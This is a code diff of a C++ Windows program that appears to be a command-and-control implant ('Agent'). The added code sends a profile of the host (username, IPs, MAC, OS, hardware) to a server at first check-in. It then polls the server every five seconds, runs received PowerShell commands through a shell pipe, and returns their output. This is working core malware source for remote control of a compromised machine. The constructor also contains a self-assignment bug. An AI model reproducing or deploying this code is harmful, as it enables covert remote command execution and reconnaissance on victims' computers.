@@ -2,7 +2,7 @@
 #define WINVER 0x0600
 #define _WIN32_WINNT 0x0600
 
-#include "AgentModule.h"
+#include "Agent.h"
 #include <stdio.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -21,6 +21,97 @@
 #pragma comment(lib, "ws2_32.lib")
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Default constructor
+Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
+{
+    commManager = commManager;
+    taskManager = taskManager;
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+void Agent::Start()
+{
+    commManager.IntialCheckin(GetHostInformation().StructToJson());
+
+    while (true)
+    {
+        if (!taskManager.HasPendingResult())
+        {
+            taskManager.QueueTask(commManager.Checkin());
+        }
+        else
+        {
+            std::string newTask = commManager.Checkin(taskManager.GetTaskResult());
+            taskManager.QueueTask(newTask);
+        }
+
+        if (taskManager.HasPendingTask())
+        {
+            CheckinResponse task = taskManager.GetNextTask();
+            std::string result;
+            switch (task.type)
+            {
+            case 1:
+                result = ExecutePowerShell(task.powerShellCommand.commandlet);
+                taskManager.StoreTaskResult(task.id, true, result);
+                break;
+            }
+        }
+        Sleep(5000);
+    }
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Agent default commands 
+
+void Agent::Exit()
+{
+    ExitProcess(0);
+}
+
+std::string Agent::GetUID() {
+    char username[256];
+    DWORD username_len = sizeof(username);
+    // Get the username of the current user
+    if (GetUserNameA(username, &username_len))
+    {
+        return std::string(username);
+    }
+
+    return std::string();
+}
+
+std::string Agent::ExecutePowerShell(const std::string& command)
+{
+#ifdef _WIN32
+    // Execute PowerShell command and return the output
+    std::string result;
+    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
+    FILE* pipe = _popen(psCommand.c_str(), "r");
+    if (!pipe)
+    {
+        return "Error executing PowerShell command.";
+    }
+
+    char buffer[128];
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
+
+    {
+        result += buffer;
+    }
+
+    _pclose(pipe);
+
+    return result;
+#else
+    (void)command; // Suppress unused parameter warning
+    return "PowerShell execution is only supported on Windows.";
+#endif
+}
+
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Helpers 
 std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
 {
 	if (!lpwstr) return "";	
@@ -34,7 +125,7 @@ std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string AgentModule::CaptureCommandOutput(const std::string& cmd)
+std::string Agent::CaptureCommandOutput(const std::string& cmd)
 {
     std::array<char, 128> buffer;
     std::string result;
@@ -53,7 +144,9 @@ std::string AgentModule::CaptureCommandOutput(const std::string& cmd)
     return result;
 }
 
-std::string AgentModule::GetMotherBoard()
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Host metadata commands 
+std::string Agent::GetMotherBoard()
 {
     std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
     std::string name = CaptureCommandOutput(cmd);
@@ -61,12 +154,7 @@ std::string AgentModule::GetMotherBoard()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-AgentModule::AgentModule()
-{
-}
-
-//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-BOOL AgentModule::GetUsername(OUT LPWSTR* szWhoamiStr)
+BOOL Agent::GetUsername(OUT LPWSTR* szWhoamiStr)
 {
 	DWORD dwSize = 0x00;
 	BOOL bResult = FALSE;
@@ -100,7 +188,7 @@ _END_OF_FUNC:
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string AgentModule::GetInternalIP() {
+std::string Agent::GetInternalIP() {
     ULONG outBufLen = 15000;
     std::vector<BYTE> buffer(outBufLen);
     PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
@@ -144,7 +232,7 @@ std::string AgentModule::GetInternalIP() {
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string AgentModule::GetExternalViaDNS() {
+std::string Agent::GetExternalViaDNS() {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";
 
@@ -168,7 +256,7 @@ std::string AgentModule::GetExternalViaDNS() {
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string AgentModule::GetMachineMacAddress() {
+std::string Agent::GetMachineMacAddress() {
     ULONG bufferSize = 15000; 
     std::vector<BYTE> buffer(bufferSize);
     
@@ -201,7 +289,7 @@ std::string AgentModule::GetMachineMacAddress() {
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string AgentModule::GetProcessName()
+std::string Agent::GetProcessName()
 {
     HANDLE hProcess = GetCurrentProcess();
     char buffer[MAX_PATH];
@@ -211,21 +299,21 @@ std::string AgentModule::GetProcessName()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int AgentModule::GetPID()
+int Agent::GetPID()
 {
     HANDLE hProcess = GetCurrentProcess();
     return GetProcessId(hProcess);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int AgentModule::GetOSVersion()
+int Agent::GetOSVersion()
 {
     PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
     return *(ULONG*)(pSharedUserData + 0x26C);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int AgentModule::GetRAM()
+int Agent::GetRAM()
 {
     MEMORYSTATUSEX memInfo;
     memInfo.dwLength = sizeof(MEMORYSTATUSEX);
@@ -241,7 +329,7 @@ int AgentModule::GetRAM()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-void AgentModule::GetTotalDiskSize(OUT double *total, OUT double *free)
+void Agent::GetTotalDiskSize(OUT double *total, OUT double *free)
 {
     ULARGE_INTEGER freeBytesAvailableToCaller;
     ULARGE_INTEGER totalNumberOfBytes;
@@ -257,7 +345,7 @@ void AgentModule::GetTotalDiskSize(OUT double *total, OUT double *free)
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int AgentModule::GetCpuCount()
+int Agent::GetCpuCount()
 {
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
@@ -265,7 +353,7 @@ int AgentModule::GetCpuCount()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-IntitalCheckinRequest AgentModule::GetHostInformation()
+IntitalCheckinRequest Agent::GetHostInformation()
 {
     std::string internalIP;
     std::string externalIP;
